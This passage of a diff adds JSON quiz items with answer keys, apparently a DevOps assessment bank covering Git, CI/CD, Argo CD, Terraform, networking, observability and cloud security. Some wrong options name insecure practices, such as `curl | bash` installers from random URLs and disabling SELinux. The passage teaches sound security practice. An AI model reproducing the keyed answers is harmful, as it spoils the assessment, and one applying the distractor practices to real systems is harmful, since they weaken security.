+  "explanation": "Reverting a merge needs `-m 1` to keep main's side. Note: re-merging the same branch later won't re-apply those changes — you'd revert the revert."
+ },
+ {
+  "id": "git-m-105",
+  "level": "medium",
+  "category": "Git",
+  "type": "mcq",
+  "title": "Messy history before review",
+  "scenario": "Your branch has 14 commits like 'wip', 'fix typo', 'fix again'. Reviewers want 2 meaningful commits.",
+  "question": "How do you clean it up before opening the PR?",
+  "options": [
+   "Interactive rebase (`git rebase -i main`) to squash/fixup and reword, then `push --force-with-lease`",
+   "Merge main into it repeatedly",
+   "Create a new repo",
+   "git stash pop"
+  ],
+  "answer": 0,
+  "explanation": "Use `fixup!` commits with `git commit --fixup` and `rebase -i --autosquash` to keep this painless. Only rewrite branches nobody else builds on."
+ },
+ {
+  "id": "git-m-106",
+  "level": "medium",
+  "category": "Git",
+  "type": "multi",
+  "title": "Protect main",
+  "question": "Which branch protection settings belong on a production repo's main branch? (select all)",
+  "options": [
+   "Require pull requests with at least one approval (and code-owner review)",
+   "Require status checks (CI) to pass before merging",
+   "Block force pushes and deletions",
+   "Allow everyone to bypass rules to move fast"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "These are standard SOC 2 and PCI change-management controls. GitHub rulesets let you apply them across all repos in an org."
+ },
+ {
+  "id": "ci-m-101",
+  "level": "medium",
+  "category": "CI/CD",
+  "type": "mcq",
+  "title": "Slow pipeline",
+  "scenario": "A 35-minute pipeline runs lint, unit tests, a 20-minute integration suite and an image build — all sequential, on every PR.",
+  "question": "Which change gives the biggest win?",
+  "options": [
+   "Run independent jobs in parallel, cache dependencies and Docker layers, and run the integration suite only on affected paths or merge queue",
+   "Buy a faster laptop",
+   "Remove all tests",
+   "Run everything twice for confidence"
+  ],
+  "answer": 0,
+  "explanation": "Parallelism, caching and test selection are the big three. A merge queue runs the heavy suite once per batch before merging, instead of on every push."
+ },
+ {
+  "id": "ci-m-102",
+  "level": "medium",
+  "category": "CI/CD",
+  "type": "mcq",
+  "title": "Secret printed in logs",
+  "scenario": "A step runs `echo $DB_URL | base64` for debugging. GitHub masks the raw secret, but the base64 output appears in the log.",
+  "question": "Why, and what's the lesson?",
+  "options": [
+   "Masking only matches the exact secret string — any transformation leaks it; never print secrets, and rotate this one",
+   "GitHub's masking is disabled on Linux",
+   "base64 is encryption, so it's fine",
+   "Logs are private, so no action needed"
+  ],
+  "answer": 0,
+  "explanation": "Treat any secret that reached a log as leaked: rotate it. Use `::add-mask::` for derived values, but the real fix is not echoing secrets."
+ },
+ {
+  "id": "ci-m-103",
+  "level": "medium",
+  "category": "CI/CD",
+  "type": "mcq",
+  "title": "Flaky deploy step",
+  "context": [
+   {
+    "kind": "log",
+    "title": "job log",
+    "content": "Run kubectl rollout status deploy/api -n prod\nWaiting for deployment \"api\" rollout to finish: 1 of 3 updated replicas are available...\nerror: timed out waiting for the condition\nError: Process completed with exit code 1.\n"
+   }
+  ],
+  "question": "Deploys fail like this about 1 in 5 times, then succeed on retry. What's the first thing to check?",
+  "options": [
+   "Why new Pods are slow to become Ready (readiness probe timings, image pull time, resource requests vs capacity) — and set a realistic `--timeout`",
+   "Add `|| true` to the step",
+   "Remove the rollout status check",
+   "Increase CI runner CPU"
+  ],
+  "answer": 0,
+  "explanation": "The pipeline is reporting a real platform signal. Look at the events (`FailedScheduling`, `ImagePull` time) and the probes. Hiding the check just moves the failure to production."
+ },
+ {
+  "id": "ci-m-104",
+  "level": "medium",
+  "category": "CI/CD",
+  "type": "multi",
+  "title": "Supply-chain hygiene in pipelines",
+  "question": "Which practices reduce CI supply-chain risk? (select all)",
+  "options": [
+   "Pin third-party actions/plugins to commit SHAs and update them via Dependabot/Renovate",
+   "Use OIDC short-lived cloud credentials instead of stored keys",
+   "Generate SBOMs and provenance (SLSA) for release artifacts",
+   "Use `curl | bash` installers from random URLs in every job"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "Pinning, short-lived credentials and provenance are the core. Vendor or verify installers — check a hash or signature — instead of piping the internet into a shell."
+ },
+ {
+  "id": "go-m-001",
+  "level": "medium",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "OutOfSync forever",
+  "context": [
+   {
+    "kind": "diff",
+    "title": "argocd app diff",
+    "content": "===== apps/Deployment payments/api ======\n-  replicas: 3\n+  replicas: 7\n"
+   }
+  ],
+  "question": "An HPA scales `api` between 3 and 12. Argo shows OutOfSync all day. Best fix?",
+  "options": [
+   "Remove `spec.replicas` from the Git manifest (or add `ignoreDifferences` for `/spec/replicas`)",
+   "Disable the HPA",
+   "Set `replicas: 12` in Git",
+   "Turn off auto-sync"
+  ],
+  "answer": 0,
+  "explanation": "Let the HPA own replicas. With selfHeal on, Argo and the HPA would fight, flapping between 3 and 7."
+ },
+ {
+  "id": "go-m-002",
+  "level": "medium",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "The webhook is down",
+  "scenario": "GitHub webhooks to Argo CD are blocked by a new firewall rule. Merges still deploy, but about 3 minutes late.",
+  "question": "Why do they still deploy at all?",
+  "options": [
+   "Argo CD also polls repos periodically (default ~3 minutes); webhooks just make it immediate",
+   "GitHub pushes manifests directly",
+   "kubelet watches Git",
+   "CI runs kubectl as a fallback"
+  ],
+  "answer": 0,
+  "explanation": "`timeout.reconciliation` (default 180s plus jitter) drives polling. Fix the webhook for fast feedback, but polling is a safety net."
+ },
+ {
+  "id": "go-m-003",
+  "level": "medium",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "Prune deleted the database",
+  "scenario": "A refactor moved a StatefulSet's manifest to another app's path. The old app had `prune: true` and deleted the StatefulSet before the new app re-created it. The data survived only because someone had set the PV reclaim policy by hand.",
+  "question": "Which guardrails prevent this class of accident?",
+  "options": [
+   "`argocd.argoproj.io/sync-options: Prune=false` on stateful resources, PVC reclaimPolicy Retain, and reviewing diffs for deletions",
+   "Disable Argo CD",
+   "Turn on selfHeal",
+   "Use `kubectl delete` manually"
+  ],
+  "answer": 0,
+  "explanation": "Per-resource `Prune=false` and `Delete=false` sync options protect critical objects. A StorageClass `reclaimPolicy: Retain` keeps volumes if PVCs are removed. Make 'resources will be deleted' a required review item."
+ },
+ {
+  "id": "go-m-004",
+  "level": "medium",
+  "category": "GitOps",
+  "type": "multi",
+  "title": "Secure Argo CD",
+  "question": "Which hardening steps are sensible for a production Argo CD? (select all)",
+  "options": [
+   "SSO via OIDC with RBAC mapped to groups; disable the local admin user",
+   "AppProjects that whitelist repos, destinations and resource kinds per team",
+   "Expose the API server publicly without auth for convenience",
+   "Deploy clusters via a dedicated management cluster and scoped cluster credentials"
+  ],
+  "answer": [
+   0,
+   1,
+   3
+  ],
+  "explanation": "Argo CD effectively has cluster-admin wherever it deploys, so treat it as a crown-jewel system: SSO, least-privilege projects, and a private API endpoint."
+ },
+ {
+  "id": "go-m-005",
+  "level": "medium",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "Migration before the app",
+  "scenario": "Release 3.2 needs a DB schema migration before the new Pods start.",
+  "question": "How do you express that in Argo CD?",
+  "options": [
+   "A Job annotated `argocd.argoproj.io/hook: PreSync` (with `hook-delete-policy`)",
+   "Ask someone to run it manually first",
+   "Put the migration in the app's liveness probe",
+   "Set `replicas: 0` then edit it"
+  ],
+  "answer": 0,
+  "explanation": "PreSync hooks run, and must succeed, before the main sync. Make migrations backward-compatible (expand, then contract) so a rollback doesn't need a reverse migration."
+ },
+ {
+  "id": "go-m-006",
+  "level": "medium",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "Who changed prod?",
+  "scenario": "An auditor asks who approved the config change that went to prod last Tuesday.",
+  "question": "In a GitOps setup, where's the answer?",
+  "options": [
+   "Git history: the PR, its approvals and the merge commit (plus Argo CD's sync history linking to that commit)",
+   "kubectl logs of the Deployment",
+   "The container registry",
+   "Nobody can know"
+  ],
+  "answer": 0,
+  "explanation": "This audit trail is a core GitOps benefit (and helps with PCI and SOC 2). Protect it with branch protection, required reviews and signed commits."
+ },
+ {
+  "id": "go-m-007",
+  "level": "medium",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "Helm in GitOps",
+  "scenario": "You deploy a vendor Helm chart with Argo CD and want per-environment values.",
+  "question": "What's a clean way?",
+  "options": [
+   "An Argo Application (or ApplicationSet) referencing the chart with `valueFiles` per environment from your Git repo",
+   "`helm install` from your laptop for each cluster",
+   "Fork the chart and hard-code prod values",
+   "Template it once and commit the output for all envs"
+  ],
+  "answer": 0,
+  "explanation": "Argo renders Helm itself (it's `helm template`, with no Tiller and no release secrets). Multiple sources let the chart come from its repo and the values from yours."
+ },
+ {
+  "id": "go-m-008",
+  "level": "medium",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "Progressive delivery",
+  "scenario": "You want new versions to receive 10% of traffic, check error rates in Prometheus, then promote automatically.",
+  "question": "Which tool adds this on top of GitOps?",
+  "options": [
+   "Argo Rollouts (or Flagger) with an AnalysisTemplate",
+   "A Kubernetes Job",
+   "Cluster Autoscaler",
+   "kube-proxy"
+  ],
+  "answer": 0,
+  "explanation": "The Rollout CRD replaces the Deployment. Canary steps with analysis query metrics and abort automatically if the error rate crosses a threshold."
+ },
+ {
+  "id": "go-m-009",
+  "level": "medium",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "Drift you didn't expect",
+  "context": [
+   {
+    "kind": "diff",
+    "title": "argocd app diff",
+    "content": "===== admissionregistration.k8s.io/MutatingWebhookConfiguration istio-sidecar-injector ======\n-  caBundle: \"\"\n+  caBundle: LS0tLS1CRUdJTi...\n"
+   }
+  ],
+  "question": "A controller injects `caBundle` at runtime, so the app is permanently OutOfSync. Fix?",
+  "options": [
+   "Add an `ignoreDifferences` rule for that field (jsonPointers `/webhooks/0/clientConfig/caBundle`) or use server-side diff",
+   "Commit the CA bundle to Git",
+   "Delete the webhook",
+   "Disable sync for the whole cluster"
+  ],
+  "answer": 0,
+  "explanation": "Fields owned by other controllers should be ignored. Server-side diff (`ServerSideDiff=true`) also understands field managers and reduces this kind of noise."
+ },
+ {
+  "id": "go-m-010",
+  "level": "medium",
+  "category": "GitOps",
+  "type": "mcq",
+  "title": "Multi-cluster at scale",
+  "scenario": "You run 25 EKS clusters across regions, all needing the same platform add-ons with a few per-cluster values.",
+  "question": "Which approach scales?",
+  "options": [
+   "An ApplicationSet with a cluster generator selecting clusters by label, with values from cluster labels/annotations",
+   "25 hand-written Applications",
+   "One kubectl apply loop in Bash",
+   "A different Git repo per cluster with copy-pasted YAML"
+  ],
+  "answer": 0,
+  "explanation": "Label the clusters (`env=prod`, `region=eu-central-1`) and let the generator template the Applications. Adding cluster 26 then means registering it with the right labels."
+ },
+ {
+  "id": "dk-m-101",
+  "level": "medium",
+  "category": "Docker",
+  "type": "mcq",
+  "title": "Container can't reach the DB on the host",
+  "scenario": "On a Linux dev box, an app container tries `localhost:5432` to reach Postgres running on the host, and gets connection refused.",
+  "question": "Why, and what's a fix?",
+  "options": [
+   "`localhost` inside the container is the container itself — use `host.docker.internal` (add `--add-host=host.docker.internal:host-gateway` on Linux) or run Postgres in the same Compose network",
+   "Postgres doesn't support containers",
+   "Docker blocks port 5432",
+   "Use `127.0.0.2`"
+  ],
+  "answer": 0,
+  "explanation": "Each container has its own network namespace. In Compose, use the service name (`db:5432`) on the shared network — that's the cleanest option."
+ },
+ {
+  "id": "dk-m-102",
+  "level": "medium",
+  "category": "Docker",
+  "type": "multi",
+  "title": "Harden a container run",
+  "question": "Which `docker run` flags reduce the blast radius if the app is compromised? (select all)",
+  "options": [
+   "`--read-only` with a `--tmpfs /tmp`",
+   "`--cap-drop ALL` (add back only what's needed)",
+   "`--user 10001:10001`",
+   "`--privileged`"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "A read-only root filesystem, no Linux capabilities and a non-root user cover most of the hardening benefit. `--privileged` gives the container almost full host access."
+ },
+ {
+  "id": "lx-m-101",
+  "level": "medium",
+  "category": "Linux",
+  "type": "mcq",
+  "title": "No space left, but df shows free space",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "server",
+    "content": "$ touch /var/spool/app/new.job\ntouch: cannot touch '/var/spool/app/new.job': No space left on device\n$ df -h /var\n/dev/nvme1n1   50G   21G   29G  42% /var\n$ df -i /var\nFilesystem      Inodes  IUsed IFree IUse% Mounted on\n/dev/nvme1n1   3276800 3276800    0  100% /var\n"
+   }
+  ],
+  "question": "What's wrong?",
+  "options": [
+   "Inodes are exhausted — millions of tiny files (e.g. a spool or session dir); find and clean them",
+   "The disk is read-only",
+   "df is lying",
+   "The kernel is out of memory"
+  ],
+  "answer": 0,
+  "explanation": "Each file uses an inode. Find the culprit with `sudo du --inodes -x /var | sort -n | tail`. XFS allocates inodes dynamically, while ext4 sets the count when the filesystem is created."
+ },
+ {
+  "id": "lx-m-102",
+  "level": "medium",
+  "category": "Linux",
+  "type": "mcq",
+  "title": "Permission denied, permissions look fine",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "rhel9",
+    "content": "$ ls -l /srv/www/index.html\n-rw-r--r--. 1 root root 512 Nov 16 09:10 /srv/www/index.html\n$ curl -s localhost | head -1\n<title>403 Forbidden</title>\n$ sudo ausearch -m avc -ts recent | tail -1\ntype=AVC msg=audit(...): avc:  denied  { read } for  pid=1402 comm=\"nginx\" name=\"index.html\" scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:var_t:s0\n"
+   }
+  ],
+  "question": "What's the correct fix?",
+  "options": [
+   "Label the content for the web server: `semanage fcontext -a -t httpd_sys_content_t '/srv/www(/.*)?'` then `restorecon -Rv /srv/www`",
+   "`setenforce 0` permanently",
+   "`chmod 777 /srv/www`",
+   "Reinstall nginx"
+  ],
+  "answer": 0,
+  "explanation": "SELinux denied it: the file has type `var_t`, but httpd may only read `httpd_sys_content_t`. Fix the label persistently instead of turning SELinux off. `audit2why` explains denials."
+ },
+ {
+  "id": "lx-m-103",
+  "level": "medium",
+  "category": "Linux",
+  "type": "mcq",
+  "title": "Time drift breaks TLS",
+  "scenario": "A VM's clock is 9 minutes ahead. AWS API calls fail with `SignatureDoesNotMatch` / `RequestTimeTooSkewed`.",
+  "question": "Correct fix?",
+  "options": [
+   "Enable chrony/systemd-timesyncd against a reliable source (on EC2: the Amazon Time Sync Service 169.254.169.123) and check `chronyc tracking`",
+   "Set the clock by hand once",
+   "Disable TLS verification",
+   "Change the timezone to UTC"
+  ],
+  "answer": 0,
+  "explanation": "SigV4 tolerates about 5 minutes of skew. Timezone isn't the issue — the clock itself is wrong. Alert on `node_timex_offset_seconds`."
+ },
+ {
+  "id": "tf-m-101",
+  "level": "medium",
+  "category": "Terraform",
+  "type": "mcq",
+  "title": "Same module, three environments",
+  "scenario": "You have dev, staging and prod with the same architecture but different sizes and accounts.",
+  "question": "Which layout is most common and least surprising?",
+  "options": [
+   "One root module per environment (separate state/backends), each calling shared versioned modules with its own tfvars",
+   "One state file for all three with `count` switches",
+   "Copy-paste the whole code per env",
+   "Workspaces sharing one AWS account and one state bucket key for everything"
+  ],
+  "answer": 0,
+  "explanation": "Separate state per environment limits blast radius and lets prod pin module versions. Workspaces can work, but they hide which environment you're in — a classic way to apply to prod by mistake."
+ },
+ {
+  "id": "tf-m-102",
+  "level": "medium",
+  "category": "Terraform",
+  "type": "mcq",
+  "title": "Error: Cycle",
+  "context": [
+   {
+    "kind": "log",
+    "title": "plan",
+    "content": "Error: Cycle: aws_security_group.app, aws_security_group.db\n"
+   }
+  ],
+  "question": "Two security groups reference each other in inline ingress rules. How do you break the cycle?",
+  "options": [
+   "Create the groups without inline rules and add `aws_vpc_security_group_ingress_rule` resources that reference both",
+   "Add depends_on in both directions",
+   "Merge both into one group",
+   "Run apply twice"
+  ],
+  "answer": 0,
+  "explanation": "Separate rule resources let Terraform create both groups first, then the rules. AWS provider v5 recommends `aws_vpc_security_group_ingress_rule` / `egress_rule` over inline rules."
+ },
+ {
+  "id": "tf-m-103",
+  "level": "medium",
+  "category": "Terraform",
+  "type": "multi",
+  "title": "Terraform in CI, properly",
+  "question": "Which belong in a Terraform pipeline for prod? (select all)",
+  "options": [
+   "`fmt -check`, `validate`, tflint and a policy/security scan (Checkov/Trivy/OPA)",
+   "Post the plan on the PR; apply exactly the saved plan file after approval",
+   "OIDC role with least privilege; separate plan (read) and apply (write) roles",
+   "Run `apply -auto-approve` from every developer laptop"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "Plan on the PR, review it, then apply that exact plan. Read-only plan roles mean a malicious PR can't change infrastructure during plan — though plans can still run arbitrary data sources and providers, so scope those roles tightly."
+ },
+ {
+  "id": "tf-m-104",
+  "level": "medium",
+  "category": "Terraform",
+  "type": "mcq",
+  "title": "Ignore what autoscaling changes",
+  "scenario": "Your ASG's `desired_capacity` is changed by scaling policies, and every plan wants to reset it.",
+  "question": "What's the clean fix?",
+  "options": [
+   "`lifecycle { ignore_changes = [desired_capacity] }`",
+   "Remove the ASG from Terraform",
+   "Run plan less often",
+   "`prevent_destroy = true`"
+  ],
+  "answer": 0,
+  "explanation": "`ignore_changes` tells Terraform to stop fighting the controller that owns that field — the same idea as removing `replicas` when an HPA owns scaling."
+ },
+ {
+  "id": "nw-m-101",
+  "level": "medium",
+  "category": "Networking",
+  "type": "mcq",
+  "title": "Small requests work, big ones hang",
+  "scenario": "Over a new site-to-site VPN, `curl` of small API responses works, but downloads and TLS handshakes with big certificate chains hang.",
+  "question": "Most likely cause?",
+  "options": [
+   "Path MTU problem — ICMP 'fragmentation needed' blocked; clamp MSS on the tunnel (e.g. 1360) or allow ICMP type 3 code 4",
+   "DNS TTL too high",
+   "The server is out of disk",
+   "HTTP/2 is disabled"
+  ],
+  "answer": 0,
+  "explanation": "Large packets exceed the tunnel MTU, and the ICMP messages that would tell senders to shrink them are blocked. MSS clamping is the standard VPN fix."
+ },
+ {
+  "id": "nw-m-102",
+  "level": "medium",
+  "category": "Networking",
+  "type": "mcq",
+  "title": "Private DNS for an interface endpoint",
+  "scenario": "You created an interface VPC endpoint for Secrets Manager, but Pods still go through the NAT Gateway.",
+  "question": "What did you most likely forget?",
+  "options": [
+   "Enable Private DNS on the endpoint (and VPC DNS hostnames/support) so the public service name resolves to the endpoint IPs",
+   "An Internet Gateway",
+   "A Route 53 public hosted zone",
+   "IPv6"
+  ],
+  "answer": 0,
+  "explanation": "With Private DNS on, `secretsmanager.<region>.amazonaws.com` resolves to the endpoint ENIs inside the VPC. Check with `dig` from a Pod. The endpoint's security group must also allow 443 from the nodes."
+ },
+ {
+  "id": "nw-m-103",
+  "level": "medium",
+  "category": "Networking",
+  "type": "mcq",
+  "title": "Connection reset by peer after 350 seconds",
+  "scenario": "Long-running DB connections from EKS through a NAT Gateway drop with resets after about 6 minutes of idle time.",
+  "question": "What's happening and the fix?",
+  "options": [
+   "NAT Gateway drops idle flows after 350s — enable TCP keepalives below that (e.g. 120s) in the client/pooler",
+   "The DB is crashing",
+   "Security groups expire",
+   "DNS cache flush"
+  ],
+  "answer": 0,
+  "explanation": "NAT Gateway's idle timeout is 350 seconds. Keepalives — or pool settings such as max idle time — keep the flow alive or recycle the connection first. Often the better fix is to avoid NAT altogether (same VPC, or PrivateLink)."
+ },
+ {
+  "id": "nw-m-104",
+  "level": "medium",
+  "category": "Networking",
+  "type": "mcq",
+  "title": "TGW vs peering",
+  "scenario": "You have 14 VPCs across 3 accounts that must talk to each other and to on-prem.",
+  "question": "Which design scales best?",
+  "options": [
+   "Transit Gateway hub with route tables per segment (prod/non-prod/shared)",
+   "Full mesh of 91 VPC peering connections",
+   "Public IPs and security groups",
+   "One giant VPC for everything"
+  ],
+  "answer": 0,
+  "explanation": "Peering isn't transitive, so a mesh grows as n(n-1)/2. TGW centralises routing and on-prem attachments, and route-table segmentation keeps prod isolated. Mind TGW per-GB charges."
+ },
+ {
+  "id": "nw-m-105",
+  "level": "medium",
+  "category": "Networking",
+  "type": "multi",
+  "title": "Debug a Pod that can't reach a Service",
+  "question": "Which checks are useful? (select all)",
+  "options": [
+   "`kubectl get endpointslices -l kubernetes.io/service-name=svc` — are there endpoints?",
+   "DNS from the Pod: `nslookup svc.ns.svc.cluster.local`",
+   "NetworkPolicies in source and destination namespaces",
+   "Rebooting the control plane"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "Work up the layers: endpoints (selector and readiness), DNS, then policy and ports. `kubectl debug` with netshoot gives you curl, dig and tcpdump inside the Pod's network namespace."
+ },
+ {
+  "id": "nw-m-106",
+  "level": "medium",
+  "category": "Networking",
+  "type": "mcq",
+  "title": "Client IP is always the load balancer",
+  "scenario": "App logs show every request from `10.0.x.x` (the ALB), but you need real client IPs for rate limiting.",
+  "question": "Where's the client IP?",
+  "options": [
+   "In the `X-Forwarded-For` header (trust only your LB's hop); for NLB use client IP preservation or Proxy Protocol v2",
+   "In the TCP source port",
+   "It's impossible to get",
+   "In the Host header"
+  ],
+  "answer": 0,
+  "explanation": "L7 proxies add `X-Forwarded-For`. Parse it from the right, trusting only known proxies, or anyone can spoof it. NLB can preserve the source IP, or pass it via Proxy Protocol."
+ },
+ {
+  "id": "nw-m-107",
+  "level": "medium",
+  "category": "Networking",
+  "type": "mcq",
+  "title": "Certificate for many subdomains",
+  "scenario": "You have 40 services under `*.internal.acme.io`, behind one ALB.",
+  "question": "Simplest certificate approach?",
+  "options": [
+   "One ACM wildcard cert for `*.internal.acme.io` (auto-renewing) on the ALB listener",
+   "40 self-signed certs",
+   "Disable TLS internally",
+   "A cert per Pod issued by hand"
+  ],
+  "answer": 0,
+  "explanation": "ACM certificates renew automatically when DNS validation stays in place. A wildcard covers one label only (`a.internal.acme.io`, not `a.b.internal.acme.io`). ALBs support up to 25 certificates via SNI by default."
+ },
+ {
+  "id": "ob-m-101",
+  "level": "medium",
+  "category": "Observability",
+  "type": "mcq",
+  "title": "Burn-rate alert",
+  "scenario": "SLO: 99.9% success over 30 days. You want to page only when the error budget is burning fast.",
+  "question": "Which alert is the classic fast-burn page?",
+  "options": [
+   "Error ratio > 14.4 × 0.1% over 1h AND over 5m (multi-window)",
+   "Any single 5xx",
+   "CPU > 80% for 5m",
+   "Error ratio > 0.1% over 30 days"
+  ],
+  "answer": 0,
+  "explanation": "A 14.4× burn exhausts about 2% of a 30-day budget in 1 hour. The short window makes the alert reset quickly once fixed. Slow burns (e.g. 6× over 6h) should create tickets."
+ },
+ {
+  "id": "ob-m-102",
+  "level": "medium",
+  "category": "Observability",
+  "type": "mcq",
+  "title": "Prometheus memory keeps growing",
+  "context": [
+   {
+    "kind": "terminal",
+    "title": "promtool",
+    "content": "$ promtool tsdb analyze /prometheus | sed -n '1,8p'\nHighest cardinality metric names:\n2381201 http_requests_total\nHighest cardinality labels:\n2210093 path\n"
+   }
+  ],
+  "question": "What's the fix?",
+  "options": [
+   "Replace raw `path` (with IDs) by a route template label, or drop it with `metric_relabel_configs`",
+   "Give Prometheus more RAM forever",
+   "Scrape less often",
+   "Delete the TSDB nightly"
+  ],
+  "answer": 0,
+  "explanation": "`/orders/8812731` should be `/orders/{id}`. Fix the instrumentation, and relabel to drop or replace the label meanwhile."
+ },
+ {
+  "id": "ob-m-103",
+  "level": "medium",
+  "category": "Observability",
+  "type": "mcq",
+  "title": "Sampling traces",
+  "scenario": "Tracing 100% of 20k req/s is too expensive, but you must keep every error and slow trace.",
+  "question": "Which sampling approach fits?",
+  "options": [
+   "Tail-based sampling in the OTel Collector: keep errors and traces > 1s, plus a small % of the rest",
+   "Head sampling at 1% only",
+   "Disable tracing",
+   "Sample by user ID"
+  ],
+  "answer": 0,
+  "explanation": "Head sampling decides before knowing the outcome, so it drops most errors. The tail-sampling processor decides after the trace completes, but it needs all spans of a trace on the same collector, so use load-balancing by trace ID."
+ },
+ {
+  "id": "ob-m-104",
+  "level": "medium",
+  "category": "Observability",
+  "type": "mcq",
+  "title": "Kubernetes metrics: which exporter?",
+  "scenario": "You want an alert when a Deployment has fewer available replicas than desired.",
+  "question": "Which source exposes that?",
+  "options": [
+   "kube-state-metrics (kube_deployment_status_replicas_available vs spec_replicas)",
+   "node-exporter",
+   "cAdvisor",
+   "metrics-server"
+  ],
+  "answer": 0,
+  "explanation": "kube-state-metrics turns API object state into metrics. node-exporter covers hosts, cAdvisor covers container resource usage, and metrics-server only feeds `kubectl top` and the HPA."
+ },
+ {
+  "id": "ob-m-105",
+  "level": "medium",
+  "category": "Observability",
+  "type": "multi",
+  "title": "A good alert",
+  "question": "Which properties make an alert worth paging someone? (select all)",
+  "options": [
+   "It reflects user impact or imminent impact",
+   "It's actionable and links to a runbook and dashboard",
+   "It has a clear owner/route",
+   "It fires on every brief CPU spike"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "If the on-call engineer can't act on an alert, it's noise. Review page volume regularly and delete or demote alerts nobody acted on."
+ },
+ {
+  "id": "ob-m-106",
+  "level": "medium",
+  "category": "Observability",
+  "type": "mcq",
+  "title": "Logs cost too much",
+  "scenario": "Your log bill doubled. 70% of the volume is DEBUG and health-check access logs.",
+  "question": "Best first move?",
+  "options": [
+   "Drop or sample health-check and DEBUG logs at the agent/collector (Alloy, Fluent Bit, OTel), and set retention tiers",
+   "Turn off all logging",
+   "Buy a bigger plan",
+   "Log everything to stdout twice"
+  ],
+  "answer": 0,
+  "explanation": "Filter at the edge, before ingestion. Keep ERROR and audit logs longer, and archive the rest cheaply in S3."
+ },
+ {
+  "id": "sc-m-101",
+  "level": "medium",
+  "category": "Security",
+  "type": "mcq",
+  "title": "Public bucket finding",
+  "scenario": "Security Hub flags an S3 bucket with a policy allowing `Principal: \"*\"` for `s3:GetObject`. It hosts a static site behind CloudFront.",
+  "question": "What's the secure pattern?",
+  "options": [
+   "Keep the bucket private (Block Public Access on) and grant CloudFront via Origin Access Control in the bucket policy",
+   "Ignore the finding",
+   "Make the bucket public-write too",
+   "Move the site to an EC2 instance"
+  ],
+  "answer": 0,
+  "explanation": "OAC lets only your CloudFront distribution read the bucket. Account-level Block Public Access stops accidents everywhere else."
+ },
+ {
+  "id": "sc-m-102",
+  "level": "medium",
+  "category": "Security",
+  "type": "mcq",
+  "title": "Over-privileged CI role",
+  "scenario": "The CI role has `AdministratorAccess`. You need to shrink it without breaking deploys.",
+  "question": "Most practical method?",
+  "options": [
+   "Use IAM Access Analyzer policy generation from CloudTrail activity, apply the generated policy, and iterate",
+   "Remove all permissions and see what breaks in prod",
+   "Rename the role",
+   "Add a permissions boundary of AdministratorAccess"
+  ],
+  "answer": 0,
+  "explanation": "Access Analyzer drafts a policy from the actions the role actually used. Also scope by resource and tags, and split plan and apply roles."
+ },
+ {
+  "id": "sc-m-103",
+  "level": "medium",
+  "category": "Security",
+  "type": "multi",
+  "title": "PCI scope reduction",
+  "scenario": "You run card processing on EKS.",
+  "question": "Which choices reduce PCI DSS scope or risk? (select all)",
+  "options": [
+   "Isolate the cardholder-data environment (dedicated accounts/VPCs/node groups and strict NetworkPolicies)",
+   "Tokenise card numbers so most services never see a PAN",
+   "Centralise audit logs (CloudTrail org trail, EKS audit logs) immutably with retention",
+   "Let every namespace share one wide-open security group with the CDE"
+  ],
+  "answer": [
+   0,
+   1,
+   2
+  ],
+  "explanation": "Segmentation and tokenisation shrink what's in scope, and immutable logs satisfy Requirement 10. Flat networks pull everything into scope."
+ },
+ {
+  "id": "sc-m-104",
+  "level": "medium",
+  "category": "Security",
+  "type": "mcq",
+  "title": "Critical CVE in a base image",
+  "scenario": "A critical OpenSSL CVE is announced. You run 120 services.",
+  "question": "What lets you answer 'which services are affected?' in minutes?",
+  "options": [
+   "SBOMs stored per image (and continuous registry scanning, e.g. Inspector/Trivy) queried for the package",
+   "Asking every team in Slack",
+   "Reading every Dockerfile",
+   "Waiting for a pentest"
+  ],
+  "answer": 0,
+  "explanation": "SBOMs plus registry scanning turn it into a query. Standardised, regularly rebuilt base images mean one upstream bump fixes most services."
+ },
+ {
+  "id": "sc-m-105",
+  "level": "medium",
+  "category": "Security",
+  "type": "mcq",
+  "title": "Bastion vs SSM",
+  "scenario": "Auditors flag port 22 open from the office IP range to production instances.",
+  "question": "Which approach removes inbound SSH entirely while keeping audited access?",
+  "options": [
+   "SSM Session Manager (IAM-authorised, logged to CloudWatch/S3) or a PAM like JumpServer with session recording",
+   "Change SSH to port 2222",
+   "Share one SSH key across the team",
+   "Open 22 to 0.0.0.0/0 with a strong password"
+  ],
+  "answer": 0,
+  "explanation": "Session Manager needs no inbound ports — the agent dials out — and every session is tied to an IAM identity and recorded. A PAM adds approvals and recording for databases and Windows too."
+ },
+ {
+  "id": "sc-m-106",
+  "level": "medium",
+  "category": "Security",
+  "type": "mcq",
+  "title": "Kubernetes API exposure",
+  "scenario": "Your EKS cluster endpoint is public with `0.0.0.0/0` allowed.",
+  "question": "What's the best improvement?",
+  "options": [
+   "Private endpoint (access via VPN/bastion/CI in the VPC), or restrict public access CIDRs, plus EKS access entries with least-privilege policies",
+   "Rely on obscurity of the URL",
+   "Disable RBAC",
+   "Share one admin kubeconfig"
+  ],
+  "answer": 0,
+  "explanation": "Even with authentication, a public API server is attack surface. EKS access entries replace the old aws-auth ConfigMap with auditable, API-managed access."
+ },
+ {
+  "id": "ob-m-107",
+  "level": "medium",
+  "category": "Observability",
+  "type": "mcq",
+  "title": "Dashboard says fine, users say slow",
+  "scenario": "Average latency is 120 ms and looks healthy, but customers complain about slow checkouts.",
+  "question": "What should you look at instead?",
+  "options": [
+   "p95/p99 latency per route (and per region/tenant)",
+   "The average again over 24h",
+   "CPU only",
+   "Number of Pods"
+  ],
+  "answer": 0,
